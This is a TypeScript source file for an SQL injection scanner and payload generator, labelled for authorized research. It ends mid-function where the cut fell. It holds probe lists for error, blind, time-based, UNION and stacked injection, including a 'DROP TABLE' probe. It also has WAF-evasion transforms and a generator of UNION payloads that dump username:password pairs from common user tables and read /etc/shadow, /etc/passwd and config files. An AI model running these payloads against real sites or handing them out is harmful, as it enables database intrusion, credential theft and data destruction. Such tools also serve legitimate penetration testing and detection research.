// ─── SQL Injection Engine ──────────────────────────────────────────────────────
// Authorized security research / bug bounty use only.
// Detects SQL injection via error-based, boolean-blind, time-based, UNION methods.

// ── Error signatures per database ─────────────────────────────────────────────
export const DB_ERROR_SIGNATURES: Record<string, RegExp[]> = {
  MySQL: [
    /you have an error in your sql syntax/i,
    /warning:\s*mysqli?/i,
    /unclosed quotation mark after the character string/i,
    /mysql_fetch_array\(\)/i,
    /mysql_numrows\(\)/i,
    /supplied argument is not a valid mysql result/i,
    /column count doesn't match value count/i,
    /unknown column .+ in 'field list'/i,
    /com\.mysql\.jdbc/i,
    /org\.hibernate\.QueryException/i,
    /\[MySQL\]\[ODBC/i,
    /SQL syntax.*MySQL/i,
  ],
  PostgreSQL: [
    /pg_query\(\)/i,
    /pg_exec\(\)/i,
    /PostgreSQL.*ERROR/i,
    /ERROR:\s+syntax error at or near/i,
    /ERROR:\s+unterminated quoted string/i,
    /ERROR:\s+invalid input syntax for/i,
    /org\.postgresql\.util\.PSQLException/i,
    /\[PostgreSQL\]/i,
    /PSQLException/i,
  ],
  MSSQL: [
    /microsoft sql server/i,
    /sql server.*error/i,
    /OLE DB.*SQL Server/i,
    /\[SQL Server\]/i,
    /Unclosed quotation mark after the character string/i,
    /Incorrect syntax near/i,
    /mssql_query\(\)/i,
    /odbc_exec\(\)/i,
    /System\.Data\.SqlClient/i,
    /SqlException/i,
    /ADODB\.Field/i,
  ],
  Oracle: [
    /ORA-\d{4,}/i,
    /oracle.*driver/i,
    /oracle.*error/i,
    /quoted string not properly terminated/i,
    /OracleException/i,
    /oracle\.jdbc/i,
    /ORA-00907/i,
    /ORA-00911/i,
    /ORA-00942/i,
  ],
  SQLite: [
    /SQLite.*error/i,
    /sqlite3\.\w+\(\)/i,
    /\[SQLITE_/i,
    /no such table/i,
    /SQLiteException/i,
  ],
  Generic: [
    /sql syntax/i,
    /syntax error/i,
    /database error/i,
    /sql error/i,
    /query failed/i,
    /\bpdoexception\b/i,
    /databaseexception/i,
    /queryexception/i,
    /invalidquerysyntaxexception/i,
  ],
};

export type DbType = 'MySQL' | 'PostgreSQL' | 'MSSQL' | 'Oracle' | 'SQLite' | 'Unknown';

export function detectDbType(html: string): DbType {
  for (const [db, patterns] of Object.entries(DB_ERROR_SIGNATURES)) {
    if (db === 'Generic') continue;
    if (patterns.some(p => p.test(html))) return db as DbType;
  }
  if (DB_ERROR_SIGNATURES.Generic.some(p => p.test(html))) return 'Unknown';
  return 'Unknown';
}

export function detectSqlError(html: string): { found: boolean; dbType: DbType; evidence: string } {
  for (const [db, patterns] of Object.entries(DB_ERROR_SIGNATURES)) {
    for (const p of patterns) {
      const m = html.match(p);
      if (m) {
        const idx = html.indexOf(m[0]);
        const evidence = html.slice(Math.max(0, idx - 60), Math.min(html.length, idx + m[0].length + 120)).trim();
        return { found: true, dbType: (db === 'Generic' ? 'Unknown' : db) as DbType, evidence };
      }
    }
  }
  return { found: false, dbType: 'Unknown', evidence: '' };
}

// ── Detection payloads ─────────────────────────────────────────────────────────
export interface SqliProbe {
  payload: string;
  technique: 'error' | 'boolean' | 'time' | 'union' | 'stacked';
  wafBypass: string;
  dbHint: DbType | 'Any';
  description: string;
}

export const SQLI_PROBES: SqliProbe[] = [
  // ── ERROR-BASED ──────────────────────────────────────────────────────────────
  { payload: `'`,                         technique: 'error', wafBypass: 'none',     dbHint: 'Any',        description: 'Single quote — triggers syntax error' },
  { payload: `''`,                        technique: 'error', wafBypass: 'none',     dbHint: 'Any',        description: 'Double single quote — escaped test' },
  { payload: `"`,                         technique: 'error', wafBypass: 'none',     dbHint: 'Any',        description: 'Double quote — double-quoted identifier' },
  { payload: `\``,                        technique: 'error', wafBypass: 'none',     dbHint: 'MySQL',      description: 'Backtick — MySQL identifier delimiter' },
  { payload: `')`,                        technique: 'error', wafBypass: 'none',     dbHint: 'Any',        description: 'Close paren — breaks function calls' },
  { payload: `'))`,                       technique: 'error', wafBypass: 'none',     dbHint: 'Any',        description: 'Double close paren' },
  { payload: `'--`,                       technique: 'error', wafBypass: 'none',     dbHint: 'Any',        description: 'Comment-out rest of query' },
  { payload: `'-- -`,                     technique: 'error', wafBypass: 'none',     dbHint: 'MySQL',      description: 'MySQL dash-space comment' },
  { payload: `' #`,                       technique: 'error', wafBypass: 'none',     dbHint: 'MySQL',      description: 'MySQL hash comment' },
  { payload: `'/*`,                       technique: 'error', wafBypass: 'none',     dbHint: 'Any',        description: 'C-style comment opener' },
  { payload: `1'`,                        technique: 'error', wafBypass: 'none',     dbHint: 'Any',        description: 'Numeric context quote break' },
  { payload: `1"`,                        technique: 'error', wafBypass: 'none',     dbHint: 'Any',        description: 'Numeric context double-quote' },

  // Error-based with WAF bypass
  { payload: `'%00`,                      technique: 'error', wafBypass: 'null_byte',        dbHint: 'Any',   description: 'Null byte after quote (terminates string in some WAFs)' },
  { payload: `%27`,                       technique: 'error', wafBypass: 'url_encode',       dbHint: 'Any',   description: 'URL-encoded single quote' },
  { payload: `%2527`,                     technique: 'error', wafBypass: 'double_url_encode', dbHint: 'Any',  description: 'Double URL-encoded single quote' },
  { payload: `\\'`,                       technique: 'error', wafBypass: 'backslash',         dbHint: 'MySQL', description: 'Backslash escape bypass' },
  { payload: `&#039;`,                    technique: 'error', wafBypass: 'html_entity',       dbHint: 'Any',   description: 'HTML entity encoded quote' },
  { payload: `' /*!UNION*/ `,            technique: 'error', wafBypass: 'inline_comment',    dbHint: 'MySQL', description: 'MySQL conditional comment bypass' },
  { payload: `'/**/OR/**/1=1`,           technique: 'error', wafBypass: 'comment_padding',   dbHint: 'Any',   description: 'Comment-padded OR injection' },
  { payload: `'+OR+1=1--`,              technique: 'error', wafBypass: 'plus_space',         dbHint: 'Any',   description: 'Plus-encoded spaces bypass' },

  // ── BOOLEAN-BASED BLIND ──────────────────────────────────────────────────────
  { payload: `' OR '1'='1`,              technique: 'boolean', wafBypass: 'none',            dbHint: 'Any',   description: 'Classic always-true string injection' },
  { payload: `' OR '1'='2`,              technique: 'boolean', wafBypass: 'none',            dbHint: 'Any',   description: 'Classic always-false string injection' },
  { payload: `' OR 1=1--`,              technique: 'boolean', wafBypass: 'none',            dbHint: 'Any',   description: 'Numeric always-true with comment' },
  { payload: `' OR 1=2--`,              technique: 'boolean', wafBypass: 'none',            dbHint: 'Any',   description: 'Numeric always-false with comment' },
  { payload: `1 OR 1=1`,                 technique: 'boolean', wafBypass: 'none',            dbHint: 'Any',   description: 'Numeric context always-true' },
  { payload: `1 AND 1=2`,                technique: 'boolean', wafBypass: 'none',            dbHint: 'Any',   description: 'Numeric context always-false' },
  { payload: `' OR 'x'='x`,             technique: 'boolean', wafBypass: 'none',            dbHint: 'Any',   description: 'String equality always-true' },
  { payload: `' OR 'x'='y`,             technique: 'boolean', wafBypass: 'none',            dbHint: 'Any',   description: 'String equality always-false' },
  { payload: `') OR ('1'='1`,           technique: 'boolean', wafBypass: 'none',            dbHint: 'Any',   description: 'Bracket-wrapped boolean' },
  { payload: `') OR ('1'='2`,           technique: 'boolean', wafBypass: 'none',            dbHint: 'Any',   description: 'Bracket-wrapped boolean false' },
  { payload: `' OR 1=1#`,               technique: 'boolean', wafBypass: 'hash_comment',    dbHint: 'MySQL', description: 'MySQL hash comment boolean' },
  { payload: `'||'1'='1`,              technique: 'boolean', wafBypass: 'concat_op',        dbHint: 'Oracle',description: 'Oracle concatenation bypass' },
  { payload: `' OR/**/1=1--`,           technique: 'boolean', wafBypass: 'comment_padding', dbHint: 'Any',   description: 'Comment-padded boolean bypass' },
  { payload: `' oR '1'='1`,            technique: 'boolean', wafBypass: 'case_variation',   dbHint: 'Any',   description: 'Case variation bypass' },
  { payload: `' Or 1=1--`,             technique: 'boolean', wafBypass: 'case_variation',   dbHint: 'Any',   description: 'Mixed case bypass' },
  { payload: `' OR 0x31=0x31--`,        technique: 'boolean', wafBypass: 'hex_encode',      dbHint: 'MySQL', description: 'Hex-encoded boolean comparison' },
  { payload: `' OR ASCII(1)=49--`,      technique: 'boolean', wafBypass: 'function_wrap',   dbHint: 'Any',   description: 'Function-wrapped comparison' },

  // ── TIME-BASED BLIND ────────────────────────────────────────────────────────
  { payload: `'; WAITFOR DELAY '0:0:5'--`,           technique: 'time', wafBypass: 'none',          dbHint: 'MSSQL',      description: 'MSSQL 5-second delay' },
  { payload: `'; IF(1=1) WAITFOR DELAY '0:0:5'--`,   technique: 'time', wafBypass: 'none',          dbHint: 'MSSQL',      description: 'MSSQL conditional delay' },
  { payload: `' AND SLEEP(5)--`,                      technique: 'time', wafBypass: 'none',          dbHint: 'MySQL',      description: 'MySQL SLEEP 5 seconds' },
  { payload: `' AND SLEEP(5)#`,                       technique: 'time', wafBypass: 'hash_comment',  dbHint: 'MySQL',      description: 'MySQL SLEEP with hash comment' },
  { payload: `' OR SLEEP(5)--`,                       technique: 'time', wafBypass: 'none',          dbHint: 'MySQL',      description: 'MySQL SLEEP via OR' },
  { payload: `1' AND SLEEP(5) AND '1'='1`,            technique: 'time', wafBypass: 'none',          dbHint: 'MySQL',      description: 'MySQL SLEEP string context' },
  { payload: `' AND (SELECT * FROM (SELECT(SLEEP(5)))A)--`, technique: 'time', wafBypass: 'subquery', dbHint: 'MySQL',     description: 'MySQL SLEEP via subquery bypass' },
  { payload: `'; SELECT PG_SLEEP(5)--`,               technique: 'time', wafBypass: 'none',          dbHint: 'PostgreSQL', description: 'PostgreSQL PG_SLEEP 5 seconds' },
  { payload: `'; SELECT SLEEP(5)--`,                  technique: 'time', wafBypass: 'none',          dbHint: 'MySQL',      description: 'MySQL stacked SLEEP' },
  { payload: `' AND 1=dbms_pipe.receive_message('a',5)--`, technique: 'time', wafBypass: 'none',     dbHint: 'Oracle',     description: 'Oracle time-based blind' },
  { payload: `' AND SLEEP/**/5/**/--`,                technique: 'time', wafBypass: 'comment_padding', dbHint: 'MySQL',   description: 'SLEEP with comment-space bypass' },
  { payload: `' AND (SELECT 1 FROM (SELECT SLEEP(5))X)--`, technique: 'time', wafBypass: 'nested',   dbHint: 'MySQL',     description: 'MySQL SLEEP nested bypass' },
  { payload: `' OR IF(1=1,SLEEP(5),0)--`,             technique: 'time', wafBypass: 'if_wrap',       dbHint: 'MySQL',     description: 'MySQL conditional SLEEP' },
  { payload: `'%3B+WAITFOR+DELAY+'0:0:5'--`,          technique: 'time', wafBypass: 'url_encode',    dbHint: 'MSSQL',     description: 'URL-encoded MSSQL delay' },

  // ── UNION-BASED ─────────────────────────────────────────────────────────────
  { payload: `' UNION SELECT NULL--`,                  technique: 'union', wafBypass: 'none',          dbHint: 'Any',   description: '1-column UNION probe' },
  { payload: `' UNION SELECT NULL,NULL--`,             technique: 'union', wafBypass: 'none',          dbHint: 'Any',   description: '2-column UNION probe' },
  { payload: `' UNION SELECT NULL,NULL,NULL--`,        technique: 'union', wafBypass: 'none',          dbHint: 'Any',   description: '3-column UNION probe' },
  { payload: `' UNION SELECT NULL,NULL,NULL,NULL--`,   technique: 'union', wafBypass: 'none',          dbHint: 'Any',   description: '4-column UNION probe' },
  { payload: `' UNION SELECT NULL,NULL,NULL,NULL,NULL--`, technique: 'union', wafBypass: 'none',       dbHint: 'Any',   description: '5-column UNION probe' },
  { payload: `' UNION SELECT 1--`,                     technique: 'union', wafBypass: 'none',          dbHint: 'Any',   description: '1-col UNION with integer' },
  { payload: `' UNION SELECT 1,2--`,                   technique: 'union', wafBypass: 'none',          dbHint: 'Any',   description: '2-col UNION with integers' },
  { payload: `' UNION SELECT 1,2,3--`,                 technique: 'union', wafBypass: 'none',          dbHint: 'Any',   description: '3-col UNION with integers' },
  { payload: `' UNION SELECT 1,2,3,4--`,               technique: 'union', wafBypass: 'none',          dbHint: 'Any',   description: '4-col UNION with integers' },
  { payload: `' UNION SELECT 'sqlitest',NULL--`,       technique: 'union', wafBypass: 'none',          dbHint: 'Any',   description: '2-col UNION string marker' },
  { payload: `' UNION SELECT 'sqlitest',NULL,NULL--`,  technique: 'union', wafBypass: 'none',          dbHint: 'Any',   description: '3-col UNION string marker' },
  { payload: `' UNION ALL SELECT NULL--`,              technique: 'union', wafBypass: 'union_all',     dbHint: 'Any',   description: 'UNION ALL bypass' },
  { payload: `' UNION/*!32302*/SELECT NULL--`,         technique: 'union', wafBypass: 'inline_comment',dbHint: 'MySQL', description: 'MySQL versioned comment UNION' },
  { payload: `' UNION%0aSELECT%0aNULL--`,             technique: 'union', wafBypass: 'newline',       dbHint: 'Any',   description: 'Newline-encoded UNION bypass' },
  { payload: `' UNiOn SeLEcT NULL--`,                 technique: 'union', wafBypass: 'case_variation', dbHint: 'Any',  description: 'Case variation UNION bypass' },

  // ── STACKED QUERIES ─────────────────────────────────────────────────────────
  { payload: `'; SELECT 1--`,                          technique: 'stacked', wafBypass: 'none',         dbHint: 'MSSQL',      description: 'MSSQL stacked query' },
  { payload: `'; DROP TABLE sqlitest--`,               technique: 'stacked', wafBypass: 'none',         dbHint: 'Any',        description: 'Classic DROP TABLE probe' },
  { payload: `'; SELECT SLEEP(0)--`,                   technique: 'stacked', wafBypass: 'none',         dbHint: 'MySQL',      description: 'MySQL stacked zero-sleep (benign)' },
  { payload: `'; SELECT pg_sleep(0)--`,                technique: 'stacked', wafBypass: 'none',         dbHint: 'PostgreSQL', description: 'PostgreSQL stacked zero-sleep' },
];

// ── WAF Bypass variants ────────────────────────────────────────────────────────
export interface WafBypassVariant {
  name: string;
  description: string;
  transform: (payload: string) => string;
}

export const WAF_BYPASSES: WafBypassVariant[] = [
  {
    name: 'None (Raw)',
    description: 'No bypass — raw payload',
    transform: p => p,
  },
  {
    name: 'URL Encode',
    description: 'URL-encode special chars (%27, %20, etc.)',
    transform: p => p.replace(/'/g, '%27').replace(/ /g, '%20').replace(/"/g, '%22'),
  },
  {
    name: 'Double URL Encode',
    description: 'Double-encode (%2527, %2520)',
    transform: p => p.replace(/'/g, '%2527').replace(/ /g, '%2520').replace(/"/g, '%2522'),
  },
  {
    name: 'Case Variation',
    description: 'Alternate upper/lower to evade keyword matching',
    transform: p => p.replace(/\b(select|union|from|where|and|or|insert|drop|sleep|waitfor|delay|order|group|having|null)\b/gi,
      w => w.split('').map((c, i) => i % 2 ? c.toUpperCase() : c.toLowerCase()).join('')),
  },
  {
    name: 'Comment Padding',
    description: 'Insert /**/ between keywords',
    transform: p => p.replace(/\b(SELECT|UNION|FROM|WHERE|AND|OR|SLEEP|WAITFOR|DELAY|INSERT|DROP|NULL)\b/gi, '/**/\$&/**/'),
  },
  {
    name: 'Inline Comments',
    description: 'MySQL /*!keyword*/ versioned comment bypass',
    transform: p => p.replace(/\b(SELECT|UNION|FROM|WHERE|AND|OR|SLEEP|WAITFOR)\b/gi, '/*!$&*/'),
  },
  {
    name: 'Newline Encode',
    description: 'Replace spaces with %0a (newline) — bypasses space-based WAF rules',
    transform: p => p.replace(/ /g, '%0a'),
  },
  {
    name: 'Tab Encode',
    description: 'Replace spaces with %09 (tab)',
    transform: p => p.replace(/ /g, '%09'),
  },
  {
    name: 'Plus Space',
    description: 'Replace spaces with + (URL query string)',
    transform: p => p.replace(/ /g, '+'),
  },
  {
    name: 'Hex Encode Values',
    description: 'Encode numeric literals as hex (1 → 0x31)',
    transform: p => p.replace(/\b(\d+)\b/g, n => '0x' + parseInt(n).toString(16)),
  },
  {
    name: 'Null Byte',
    description: 'Insert %00 null byte (terminates strings in some WAF parsers)',
    transform: p => p.replace(/\b(SELECT|UNION|FROM)\b/gi, '%00$&'),
  },
];

// ── Database dump payload generator ───────────────────────────────────────────
export interface DumpTarget {
  label: string;
  description: string;
}

export const DUMP_TARGETS: Record<string, DumpTarget> = {
  list_databases:    { label: 'List All Databases',    description: 'Enumerate all databases on the server' },
  list_tables:       { label: 'List All Tables',       description: 'List all tables in the current database' },
  list_columns:      { label: 'List Columns',          description: 'List columns for a specific table' },
  users_table:       { label: 'User/Login Table',      description: 'Dump common user/credential tables' },
  extract_data:      { label: 'Extract Table Data',    description: 'Extract all rows from a specific table' },
  current_user:      { label: 'DB User & Privileges',  description: 'Get current DB user, version, hostname' },
  read_file:         { label: 'Read System Files',     description: 'MySQL FILE privilege — read /etc/passwd etc.' },
};

export interface DumpPayload {
  target: string;
  dbType: DbType;
  columnCount: number;
  columnPosition: number;
  payload: string;
  description: string;
  urlEncoded: string;
  notes: string;
}

export function generateDumpPayloads(
  paramName: string,
  baseUrl: string,
  dbType: DbType,
  columnCount: number,
  dumpTarget: string,
  wafBypassName: string,
  customTable = 'users',
  customColumn = 'username,password',
): DumpPayload[] {
  const nulls = (n: number, replace: number, val: string) =>
    Array.from({ length: n }, (_, i) => (i + 1 === replace ? val : 'NULL')).join(',');

  const bypass = WAF_BYPASSES.find(b => b.name === wafBypassName) ?? WAF_BYPASSES[0];

  const buildUrl = (payload: string): string => {
    try {
      const u = new URL(baseUrl);
      u.searchParams.set(paramName, payload);
      return u.toString();
    } catch { return `${baseUrl}?${paramName}=${encodeURIComponent(payload)}`; }
  };

  const col = Math.min(1, columnCount); // position 1 by default

  const queries: Array<{ payload: string; desc: string; notes: string }> = [];

  if (dumpTarget === 'current_user') {
    const q: Record<DbType | 'Unknown', string[]> = {
      MySQL: [
        `' UNION SELECT ${nulls(columnCount, col, 'CONCAT(user(),0x7c,version(),0x7c,database(),0x7c,@@hostname)')}-- -`,
        `' UNION SELECT ${nulls(columnCount, col, 'CONCAT(user(),0x7c,@@datadir,0x7c,@@global.secure_file_priv)')}-- -`,
      ],
      PostgreSQL: [
        `' UNION SELECT ${nulls(columnCount, col, "current_user||'|'||version()||'|'||current_database()")}-- -`,
      ],
      MSSQL: [
        `' UNION SELECT ${nulls(columnCount, col, "SYSTEM_USER+' | '+@@version+' | '+DB_NAME()")}-- -`,
      ],
      Oracle: [
        `' UNION SELECT ${nulls(columnCount, col, "user||'|'||sys.database_name FROM dual")}-- -`,
      ],
      SQLite: [
        `' UNION SELECT ${nulls(columnCount, col, "sqlite_version()||'|'||sqlite_source_id()")}-- -`,
      ],
      Unknown: [
        `' UNION SELECT ${nulls(columnCount, col, 'version()')}-- -`,
      ],
    };
    (q[dbType] ?? q.Unknown).forEach(p => queries.push({ payload: p, desc: 'Current DB user + version + database name', notes: '0x7c = "|" separator in hex' }));
  }

  if (dumpTarget === 'list_databases') {
    const q: Record<DbType | 'Unknown', string[]> = {
      MySQL: [
        `' UNION SELECT ${nulls(columnCount, col, 'GROUP_CONCAT(schema_name ORDER BY schema_name SEPARATOR 0x7c) FROM information_schema.schemata-- -')}`,
        `' UNION SELECT ${nulls(columnCount, col, 'schema_name')} FROM information_schema.schemata LIMIT 0,1-- -`,
      ],
      PostgreSQL: [
        `' UNION SELECT ${nulls(columnCount, col, "datname FROM pg_database")}-- -`,
        `' UNION SELECT ${nulls(columnCount, col, "string_agg(datname, '|') FROM pg_database")}-- -`,
      ],
      MSSQL: [
        `' UNION SELECT ${nulls(columnCount, col, 'name FROM master..sysdatabases')}-- -`,
        `' UNION SELECT ${nulls(columnCount, col, 'STRING_AGG(name,0x7c) FROM master..sysdatabases')}-- -`,
      ],
      Oracle: [
        `' UNION SELECT ${nulls(columnCount, col, 'LISTAGG(DISTINCT owner,0x7c) WITHIN GROUP (ORDER BY owner) FROM all_tables')}-- -`,
      ],
      SQLite: [
        `' UNION SELECT ${nulls(columnCount, col, "tbl_name FROM sqlite_master WHERE type='table'")}-- -`,
      ],
      Unknown: [
        `' UNION SELECT ${nulls(columnCount, col, 'schema_name FROM information_schema.schemata')}-- -`,
      ],
    };
    (q[dbType] ?? q.Unknown).forEach(p => queries.push({ payload: p, desc: 'Enumerate all databases', notes: 'GROUP_CONCAT returns all DB names as one row' }));
  }

  if (dumpTarget === 'list_tables') {
    const q: Record<DbType | 'Unknown', string[]> = {
      MySQL: [
        `' UNION SELECT ${nulls(columnCount, col, 'GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR 0x7c) FROM information_schema.tables WHERE table_schema=database()')}-- -`,
        `' UNION SELECT ${nulls(columnCount, col, 'table_name')} FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1-- -`,
      ],
      PostgreSQL: [
        `' UNION SELECT ${nulls(columnCount, col, "string_agg(tablename,'|') FROM pg_tables WHERE schemaname='public'")}-- -`,
        `' UNION SELECT ${nulls(columnCount, col, "tablename FROM pg_tables WHERE schemaname='public' LIMIT 1")}-- -`,
      ],
      MSSQL: [
        `' UNION SELECT ${nulls(columnCount, col, 'table_name FROM information_schema.tables')}-- -`,
        `' UNION SELECT ${nulls(columnCount, col, 'STRING_AGG(table_name,0x7c) FROM information_schema.tables')}-- -`,
      ],
      Oracle: [
        `' UNION SELECT ${nulls(columnCount, col, 'table_name FROM all_tables WHERE ROWNUM<=10')}-- -`,
      ],
      SQLite: [
        `' UNION SELECT ${nulls(columnCount, col, "GROUP_CONCAT(tbl_name,'|') FROM sqlite_master WHERE type='table'")}-- -`,
      ],
      Unknown: [
        `' UNION SELECT ${nulls(columnCount, col, 'table_name FROM information_schema.tables WHERE table_schema=database()')}-- -`,
      ],
    };
    (q[dbType] ?? q.Unknown).forEach(p => queries.push({ payload: p, desc: 'List all tables in current DB', notes: 'Pipe-separated table list returned in the vulnerable column' }));
  }

  if (dumpTarget === 'list_columns') {
    const tbl = customTable;
    const q: Record<DbType | 'Unknown', string[]> = {
      MySQL: [
        `' UNION SELECT ${nulls(columnCount, col, `GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR 0x7c) FROM information_schema.columns WHERE table_name='${tbl}'`)}-- -`,
      ],
      PostgreSQL: [
        `' UNION SELECT ${nulls(columnCount, col, `string_agg(column_name,'|') FROM information_schema.columns WHERE table_name='${tbl}'`)}-- -`,
      ],
      MSSQL: [
        `' UNION SELECT ${nulls(columnCount, col, `STRING_AGG(column_name,0x7c) FROM information_schema.columns WHERE table_name='${tbl}'`)}-- -`,
      ],
      Oracle: [
        `' UNION SELECT ${nulls(columnCount, col, `LISTAGG(column_name,0x7c) WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE table_name=UPPER('${tbl}')`)}-- -`,
      ],
      SQLite: [
        `' UNION SELECT ${nulls(columnCount, col, `GROUP_CONCAT(name,'|') FROM pragma_table_info('${tbl}')`)}-- -`,
      ],
      Unknown: [
        `' UNION SELECT ${nulls(columnCount, col, `column_name FROM information_schema.columns WHERE table_name='${tbl}'`)}-- -`,
      ],
    };
    (q[dbType] ?? q.Unknown).forEach(p => queries.push({ payload: p, desc: `List columns of table "${tbl}"`, notes: 'Returns all column names pipe-separated' }));
  }

  if (dumpTarget === 'users_table') {
    const commonTables = ['users', 'accounts', 'admin', 'members', 'customers', 'staff'];
    const q: Record<DbType | 'Unknown', string[]> = {
      MySQL: commonTables.map(tbl =>
        `' UNION SELECT ${nulls(columnCount, col, `GROUP_CONCAT(username,0x3a,password SEPARATOR 0x7c) FROM ${tbl} LIMIT 10`)}-- -`
      ),
      PostgreSQL: commonTables.map(tbl =>
        `' UNION SELECT ${nulls(columnCount, col, `string_agg(username||':'||password,'|') FROM ${tbl} LIMIT 10`)}-- -`
      ),
      MSSQL: commonTables.map(tbl =>
        `' UNION SELECT ${nulls(columnCount, col, `STRING_AGG(username+':'+password,0x7c) FROM ${tbl}`)}-- -`
      ),
      Oracle: commonTables.map(tbl =>
        `' UNION SELECT ${nulls(columnCount, col, `LISTAGG(username||':'||password,0x7c) WITHIN GROUP (ORDER BY username) FROM ${tbl} WHERE ROWNUM<=10`)}-- -`
      ),
      SQLite: commonTables.map(tbl =>
        `' UNION SELECT ${nulls(columnCount, col, `GROUP_CONCAT(username||':'||password,'|') FROM ${tbl} LIMIT 10`)}-- -`
      ),
      Unknown: commonTables.map(tbl =>
        `' UNION SELECT ${nulls(columnCount, col, `username,password FROM ${tbl}`)}-- -`
      ),
    };
    (q[dbType] ?? q.Unknown).slice(0, 4).forEach((p, i) => queries.push({ payload: p, desc: `Dump credentials from "${commonTables[i]}"`, notes: 'Returns username:password pairs' }));
  }

  if (dumpTarget === 'extract_data') {
    const cols = customColumn.split(',').map(c => c.trim()).filter(Boolean);
    const selectCols = (cols.length > 1)
      ? `CONCAT(${cols.map((c, i) => i > 0 ? `0x7c,${c}` : c).join(',')})`
      : cols[0] ?? 'id';

    queries.push({
      payload: `' UNION SELECT ${nulls(columnCount, col, `GROUP_CONCAT(${selectCols} SEPARATOR 0x0a) FROM ${customTable} LIMIT 20`)}-- -`,
      desc: `Dump ${customColumn} from "${customTable}" (rows 1–20)`,
      notes: '0x0a = newline separator between rows',
    });
    queries.push({
      payload: `' UNION SELECT ${nulls(columnCount, col, `${selectCols} FROM ${customTable} LIMIT 0,1`)}-- -`,
      desc: `Dump first row of "${customTable}"`,
      notes: 'Row-by-row extraction via LIMIT offset',
    });
    queries.push({
      payload: `' UNION SELECT ${nulls(columnCount, col, `${selectCols} FROM ${customTable} LIMIT 1,1`)}-- -`,
      desc: `Dump second row of "${customTable}"`,
      notes: 'Increment LIMIT first param to page through rows',
    });
  }

  if (dumpTarget === 'read_file') {
    const files = ['/etc/passwd', '/etc/shadow', '/var/www/html/config.php', 'C:/Windows/win.ini', '/proc/self/environ'];
    files.forEach(f =>
      queries.push({
        payload: `' UNION SELECT ${nulls(columnCount, col, `LOAD_FILE('${f}')`)}-- -`,
        desc: `Read file: ${f}`,
        notes: 'Requires MySQL FILE privilege and secure_file_priv=\'\'',
      })
    );
  }

  return queries.map(({ payload, desc, notes }) => {
    const bypassed = bypass.transform(payload);
    return {
      target: dumpTarget,
      dbType,
      columnCount,
      columnPosition: col,
      payload: bypassed,
      description: desc,
      urlEncoded: buildUrl(bypassed),
      notes,
    };
  });
}

// ── Scanner ────────────────────────────────────────────────────────────────────
export interface SqliHit {
  probe: SqliProbe;
  technique: string;
  dbType: DbType;
  evidence: string;
  responseTime: number;
  baselineTime: number;
  isTimeBased: boolean;
  severity: 'critical' | 'high' | 'medium' | 'low';
  columnCount?: number;
  wafDetected: boolean;
}

export interface SqliParamResult {
  param: string;
  originalValue: string;
  vulnerable: boolean;
  severity: string;
  dbType: DbType;
  techniques: string[];
  hits: SqliHit[];
  columnCount: number | null;
  totalTested: number;
  wafDetected: boolean;
}

const WAF_SIGNATURES = [
  /forbidden/i, /blocked by/i, /security check/i, /cloudflare/i, /sucuri/i,
  /mod_security/i, /access denied/i, /invalid request/i, /request rejected/i,
  /web application firewall/i, /your request has been blocked/i, /this page cannot be displayed/i,
];

function detectWaf(html: string, statusCode: number): boolean {
  if (statusCode === 403 || statusCode === 406 || statusCode === 429) return true;
  return WAF_SIGNATURES.some(p => p.test(html));
}

async function withConcurrency<T>(tasks: (() => Promise<T>)[], limit: number): Promise<T[]> {
  const results: T[] = new Array(tasks.length);
  let idx = 0;
  async function worker() { while (idx < tasks.length) { const i = idx++; results[i] = await tasks[i](); } }
  await Promise.all(Array.from({ length: Math.min(limit, tasks.length) }, worker));
  return results;
}

async function fetchWithTiming(
  url: string,
  timeoutMs = 12000
): Promise<{ html: string; status: number; time: number }> {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), timeoutMs);
  const start = Date.now();
  try {
    const resp = await fetch(url, {
      signal: ctrl.signal,
      headers: {
        'User-Agent': 'Mozilla/5.0 (compatible; SecurityResearch/1.0)',
        'Accept': 'text/html,*/*',
      },
      redirect: 'follow',
    });
    clearTimeout(t);
    const html = await resp.text();
    return { html, status: resp.status, time: Date.now() - start };
  } catch { clearTimeout(t); return { html: '', status: 0, time: Date.now() - start }; }
}

function detectColumnCount(html: string): number | null {
  // Look for integers 1-10 appearing in the page that match our probe markers
  const markers = ['sqlitest', '1', '2', '3', '4', '5'];
  for (const m of markers) {
    if (html.includes(m)) return null;
  }
  return null;
}

export async function scanSqlParam(
  baseUrl: URL,
  paramName: string,
  originalValue: string,
  onHit?: (hit: SqliHit) => void
): Promise<SqliParamResult> {
  // Baseline request
  const baselineResp = await fetchWithTiming(baseUrl.toString());
  const baselineLength = baselineResp.html.length;
  const baselineTime = baselineResp.time;

  const hits: SqliHit[] = [];
  let wafDetected = false;
  let dbType: DbType = 'Unknown';
  let columnCount: number | null = null;
  const techniques = new Set<string>();

  const tasks = SQLI_PROBES.map(probe => async (): Promise<void> => {
    const testUrl = new URL(baseUrl.toString());
    testUrl.searchParams.set(paramName, probe.payload);

    const resp = await fetchWithTiming(testUrl.toString(), probe.technique === 'time' ? 12000 : 8000);

    if (detectWaf(resp.html, resp.status)) wafDetected = true;

    // Error-based detection
    const errResult = detectSqlError(resp.html);
    if (errResult.found) {
      const db = errResult.dbType;
      if (db !== 'Unknown') dbType = db;
      const hit: SqliHit = {
        probe, technique: 'Error-Based', dbType: db,
        evidence: errResult.evidence, responseTime: resp.time, baselineTime,
        isTimeBased: false, severity: 'critical', wafDetected: detectWaf(resp.html, resp.status),
      };
      hits.push(hit);
      techniques.add('Error-Based');
      onHit?.(hit);
      return;
    }

    // Time-based detection (5s delay → response must be ≥ 4s longer than baseline)
    if (probe.technique === 'time' && resp.time > baselineTime + 3500) {
      const hit: SqliHit = {
        probe, technique: 'Time-Based Blind', dbType: probe.dbHint === 'Any' ? 'Unknown' : probe.dbHint as DbType,
        evidence: `Response time: ${resp.time}ms vs baseline: ${baselineTime}ms (Δ${resp.time - baselineTime}ms)`,
        responseTime: resp.time, baselineTime, isTimeBased: true, severity: 'critical',
        wafDetected: detectWaf(resp.html, resp.status),
      };
      hits.push(hit);
      techniques.add('Time-Based Blind');
      onHit?.(hit);
      return;
    }

    // Boolean-based: significant length change (>15% or >200 chars) on always-true vs always-false
    if (probe.technique === 'boolean') {
      const lengthDiff = Math.abs(resp.html.length - baselineLength);
      const pctDiff = baselineLength > 0 ? lengthDiff / baselineLength : 0;
